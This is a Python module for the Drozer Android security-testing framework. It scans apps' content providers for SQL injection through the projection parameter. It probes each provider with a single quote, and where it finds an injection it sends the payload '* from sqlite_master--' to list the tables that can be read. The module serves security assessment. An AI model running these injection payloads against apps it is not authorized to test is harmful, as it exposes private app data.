from mwr.droidhg.modules import common, Module
from mwr.droidhg.reflection import ReflectionException

class SqlTableDump(Module, common.ClassLoader, common.FileSystem, common.PackageManager, common.Provider, common.Strings, common.ZipFile, common.Vulnerability, common.TableFormatter):

    name = "Test for accessible SQL tables in content providers with SQL injection vulnerabilities."
    description = "Enumerate SQL tables accessible via SQL (projection) Injection vulnerabilities."
    examples = ""
    author = "Rijnard"
    date = "2013-01-23"
    license = "MWR Code License"
    path = ["scanner", "provider"]

    def add_arguments(self, parser):
        parser.add_argument("package_or_uri", help="specify a package to search", metavar="package or uri", nargs="?")
        
    def execute(self, arguments):
        foundOne = False # for printing sugar
        if arguments.package_or_uri != None and arguments.package_or_uri.startswith("content://"):
            foundOne |= self.__test_uri(arguments.package_or_uri)
        else:
            for uri in self.findAllContentUris(arguments.package_or_uri):
                foundOne |= self.__test_uri(uri)

        self.stdout.write("============================\n") if foundOne else None

    def __test_uri(self, uri):
        try:
            self.contentResolver().query(uri, projection=["'"])
        except ReflectionException as e:
            if e.message.find("unrecognized token") >= 0: # if there's a projection injection
                try:
                    cursor = self.contentResolver().query(uri, projection=["* from sqlite_master--"]) # query the sqlite_master
                    resultSet = self.getResultSet(cursor) # contains tables in sqlite_master
                    self.stdout.write("============================\n")
                    self.stdout.write("Accessible tables for uri " + uri + ": \n\n---")
                    self.stdout.write('\n---'.join([str(x[1]) for x in resultSet[1:]]) + "\n") # Get the table names
                    return True
                except:
                    pass
        return False
